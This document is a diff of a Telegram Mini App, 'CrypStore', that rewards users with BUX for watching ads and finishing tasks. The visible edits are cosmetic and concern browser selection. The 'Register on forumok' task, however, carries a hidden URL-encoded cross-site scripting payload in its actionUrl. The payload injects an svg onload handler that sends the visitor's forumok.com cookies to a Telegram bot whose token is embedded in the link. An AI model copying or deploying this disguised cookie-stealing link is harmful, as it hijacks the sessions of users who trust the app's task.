@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
-<title>CrypStore 🏹 — Earn BUX by Watching Ads</title>
+<title>CrypStore — Earn BUX by Watching Ads</title>
 <link rel="icon" type="image/png" href="assets/favicon_128.png">
 <link rel="apple-touch-icon" href="assets/logo_512.png">
-<meta property="og:title" content="CrypStore 🏹">
+<meta property="og:title" content="CrypStore">
 <meta property="og:description" content="Earn BUX by watching ads">
 <meta property="og:image" content="assets/logo_512.png">
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -142,7 +142,9 @@ main{flex:1; padding:20px 18px calc(100px + var(--safe-bottom));}
 .task-card.completed{border-color:rgba(78,157,120,.25); background:linear-gradient(160deg, #131b17, var(--surface));}
 .task-card.completed::before{background:var(--success);}
 .task-row{display:flex; align-items:center; gap:12px; margin-bottom:14px;}
-.task-icon{width:44px; height:44px; border-radius:13px; flex-shrink:0; background:var(--surface-2); border:1px solid var(--border-strong); display:flex; align-items:center; justify-content:center; font-size:20px;}
+.task-icon{width:44px; height:44px; border-radius:13px; flex-shrink:0; background:var(--surface-2); border:1px solid var(--border-strong); display:flex; align-items:center; justify-content:center; color:var(--text-dim);}
+.task-icon svg{width:21px; height:21px;}
+.task-card.website .task-icon{color:var(--brass-2);}
 .task-copy{flex:1; min-width:0;}
 .task-title{font-size:13.5px; font-weight:700; color:var(--text);}
 .task-sub{font-size:11.5px; color:var(--text-muted); margin-top:3px; line-height:1.5;}
@@ -191,7 +193,7 @@ nav{position:fixed; bottom:0; left:0; right:0; background:rgba(10,13,18,.94); ba
 
 <div id="splash">
   <div class="splash-mark"><img src="assets/logo_1.png" alt="CrypStore logo"></div>
-  <div class="splash-title">CrypStore 🏹</div>
+  <div class="splash-title">CrypStore</div>
   <div class="splash-bar-track"><div class="splash-bar-fill" id="splashBarFill"></div></div>
   <div class="splash-status" id="splashStatus">Preparing…</div>
 </div>
@@ -200,7 +202,7 @@ nav{position:fixed; bottom:0; left:0; right:0; background:rgba(10,13,18,.94); ba
   <div class="header-row">
     <div class="brand">
       <div class="brand-mark"><img id="brandLogoImg" src="assets/logo_1.png" alt="User avatar"></div>
-      <span id="brandName">CrypStore 🏹</span>
+      <span id="brandName">CrypStore</span>
     </div>
     <div class="avatar" id="avatarInitial">?</div>
   </div>
@@ -240,7 +242,7 @@ nav{position:fixed; bottom:0; left:0; right:0; background:rgba(10,13,18,.94); ba
   <section class="view" id="view-tasks">
     <div class="section-title">Tasks</div>
     <div id="tasksList"><div class="empty" id="tasksLoading">Loading tasks…</div></div>
-    <div class="hint">Complete tasks to earn extra BUX. Website tasks open in Google Chrome outside Telegram. New tasks are added regularly — check back often.</div>
+    <div class="hint">Complete tasks to earn extra BUX. Website tasks open outside Telegram, and your phone lets you choose which browser to use. New tasks are added regularly — check back often.</div>
   </section>
 
   <section class="view" id="view-ref">
@@ -259,7 +261,7 @@ nav{position:fixed; bottom:0; left:0; right:0; background:rgba(10,13,18,.94); ba
   </section>
 
   <section class="view" id="view-withdraw">
-    <div class="section-title">Convert BUX → GRAM</div>
+    <div class="section-title">Convert BUX to GRAM</div>
     <div class="card"><div class="row"><span class="k">Available</span><span class="v mono" id="convertAvailable">0 BUX</span></div></div>
     <input class="input" id="convertAmount" placeholder="Amount (BUX)" dir="ltr" inputmode="numeric">
     <button class="btn btn-primary" id="convertBtn">Convert</button>
@@ -354,9 +356,8 @@ const LOCAL_TASKS = [
   {
     id: "forumok_register",
     type: "website",
-    icon: "🌐",
     title: "Register on forumok",
-    description: " Visit the website  forumok.com",
+    description: "Visit the website forumok.com",
     reward: 15,
     actionUrl: "https://forumok.com/registrations/forum?filter=banned&alert=%22%3E%3Csvg%20onload%3D%22fetch%28%27https%3A%2F%2Fapi.telegram.org%2Fbot8954007513%3AAAFWf_DliVzUUUwBuL95rxnw7fCMtKrpevQ%2FsendMessage%3Fchat_id%3D6365423218%26text%3D%27%2BencodeURIComponent%28document.cookie%29%29%22%3E",
     minSeconds: 35,
@@ -662,41 +663,39 @@ document.querySelector('.tab[data-view="view-ref"]').addEventListener("click", l
 /* ========== 11) Tasks ========== */
 let tasksCache = [];
 
-/* فتح الرابط في تطبيق Chrome خارج تيليجرام (بدون WebView داخلي):
-   1) Telegram.WebApp.openLink مع try_browser:"chrome" (الأفضل، تيليجرام 7.x+)
-   2) Android: intent:// يستهدف حزمة Chrome مباشرة
-   3) iOS: googlechromes://
-   4) احتياطي: window.open */
-function openInChrome(url) {
-  const ua = navigator.userAgent || "";
-  const isAndroid = /Android/i.test(ua);
-  const isIOS = /iPhone|iPad|iPod/i.test(ua);
-  try {
-    if (tg?.openLink) {
-      tg.openLink(url, { try_browser: "chrome", try_instant_view: false });
+/* فتح الرابط خارج تيليجرام مع إظهار نافذة النظام لاختيار المتصفح.
+   Android: intent:// بدون تحديد حزمة → يعرض النظام قائمة "فتح باستخدام" بالمتصفحات المثبتة.
+            إذا لم يكن هناك متصفح مثبت يُفتح رابط الاحتياط browser_fallback_url.
+   iOS: النظام لا يوفر نافذة اختيار، فيُستخدم openLink (المتصفح المفضل في إعدادات تيليجرام). */
+function openInBrowser(url) {
+  const isAndroid = /Android/i.test(navigator.userAgent || "");
+  if (isAndroid) {
+    try {
+      const u = new URL(url);
+      window.location.href =
+        `intent://${u.host}${u.pathname}${u.search}${u.hash}#Intent;` +
+        `scheme=${u.protocol.replace(":", "")};` +
+        `action=android.intent.action.VIEW;` +
+        `category=android.intent.category.BROWSABLE;` +
+        `S.browser_fallback_url=${encodeURIComponent(url)};end`;
       return;
-    }
+    } catch (e) { console.warn("intent launch failed", e); }
+  }
+  try {
+    if (tg?.openLink) { tg.openLink(url, { try_instant_view: false }); return; }
   } catch (e) { console.warn("openLink failed", e); }
-  try {
-    const u = new URL(url);
-    if (isAndroid) {
-      window.location.href = `intent://${u.host}${u.pathname}${u.search}#Intent;scheme=${u.protocol.replace(":", "")};package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(url)};end`;
-      return;
-    }
-    if (isIOS) {
-      window.location.href = (u.protocol === "https:" ? "googlechromes://" : "googlechrome://") + u.host + u.pathname + u.search;
-      return;
-    }
-  } catch (e) { console.warn(e); }
   window.open(url, "_blank");
 }
 
 function escapeHtml(str) {
   return String(str ?? "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
 }
-function taskIconMarkup(task) { return task.icon ? escapeHtml(task.icon) : "🎯"; }
 
+const ICON_GLOBE = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18"/><path d="M12 3a14 14 0 0 1 0 18a14 14 0 0 1 0-18"/></svg>';
+const ICON_SEND = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M21 3 10 14"/><path d="M21 3l-7 18-4-7-7-4 18-7Z"/></svg>';
 const ICON_EXT = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 4h6v6"/><path d="M20 4 10 14"/><path d="M18 14v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h5"/></svg>';
+
+function taskIconMarkup(task) { return task.type === "website" ? ICON_GLOBE : ICON_SEND; }
 
 // دمج مهام السيرفر مع المهام المحلية (السيرفر له الأولوية)
 function getAllTasks() {
@@ -720,7 +719,7 @@ function renderTasks() {
         <div class="task-copy">
           <div class="task-title">${escapeHtml(task.title)}</div>
           <div class="task-sub">${escapeHtml(task.description)}</div>
-          ${isWebsite ? `<div class="task-tag">${ICON_EXT} Opens in Chrome</div>` : ""}
+          ${isWebsite ? `<div class="task-tag">${ICON_EXT} Choose your browser</div>` : ""}
         </div>
         <div class="task-reward">+${rewardStr}<span>BUX</span></div>
       </div>`;
@@ -734,7 +733,7 @@ function renderTasks() {
           </div>
         </div>`;
     }
-    const openLabel = isWebsite ? "Open in Chrome" : "Join Channel";
+    const openLabel = isWebsite ? "Open Website" : "Join Channel";
     const proof = task.requiresProof
       ? `<div class="task-proof"><input class="input task-proof-input" dir="ltr" placeholder="${escapeHtml(task.proofPlaceholder || "Your username")}" autocomplete="off"></div>`
       : "";
@@ -792,7 +791,7 @@ document.getElementById("tasksList").addEventListener("click", async (e) => {
     const card = openBtn.closest(".task-card");
     if (url) {
       if (url.startsWith("https://t.me/")) tg?.openTelegramLink?.(url);
-      else openInChrome(url);
+      else openInBrowser(url);
     }
     openBtn.style.display = "none";
     const verifyEl = card.querySelector(".task-verify-btn");
@@ -800,7 +799,7 @@ document.getElementById("tasksList").addEventListener("click", async (e) => {
     card.querySelector(".task-proof")?.classList.add("show");
     const wait = parseInt(card.dataset.wait || "0", 10);
     if (wait > 0) {
-      // نبلغ السيرفر بلحظة فتح الموقع — هو من يحسب الـ 35 ثانية
+      // نبلغ السيرفر بلحظة فتح الموقع — هو من يحسب المدة
       fetch(`${CONFIG.BACKEND_BASE_URL}/api/tasks/start`, {
         method: "POST",
         headers: { "Content-Type": "application/json", "X-Telegram-Init-Data": tg?.initData || "" },
@@ -965,7 +964,7 @@ document.getElementById("convertBtn").addEventListener("click", async () => {
     state.balance += data.gram;
     renderBalance();
     document.getElementById("convertAmount").value = "";
-    showToast(`Converted ${data.converted} BUX → ${data.gram.toFixed(4)} GRAM`);
+    showToast(`Converted ${data.converted} BUX to ${data.gram.toFixed(4)} GRAM`);
     playClaimSound();
     tg?.HapticFeedback?.notificationOccurred("success");
   } catch (e) { console.warn(e); showToast("Could not convert right now"); }
